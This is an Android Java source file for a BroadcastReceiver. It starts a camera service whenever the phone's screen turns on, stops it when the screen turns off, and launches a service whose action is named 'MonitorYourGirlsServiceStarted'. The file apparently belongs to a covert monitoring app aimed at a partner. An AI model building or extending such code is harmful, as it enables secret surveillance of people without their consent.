package screen.log;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

import camera.log.ActivateCameraService;
import camera.log.CameraService;

public class ScreenReceiver extends BroadcastReceiver {
    private static final String TAG = "ScreenReceiver";



    @Override
    public void onReceive(Context context, Intent intent) {
        //
        if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {    //屏幕关闭
            Log.i(TAG,"锁屏");
//            // 关闭相机服务；
//            Intent face = new Intent(context, CameraService.class);
//            context.stopService(face);
            ActivateCameraService activateCameraService = ActivateCameraService.create(context);
            activateCameraService.stop();
        } else if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)) {   //屏幕打开
            Log.i(TAG,"开屏");

            intent.setAction("MonitorYourGirlsServiceStarted");
            //added by me
            intent.setPackage(context.getPackageName());
            context.startService(intent);

            // 开启相机服务
//            Intent face = new Intent(context, CameraService.class);
//            context.startService(face);
            ActivateCameraService activateCameraService = ActivateCameraService.create(context);
            activateCameraService.start();
        }
    }
}
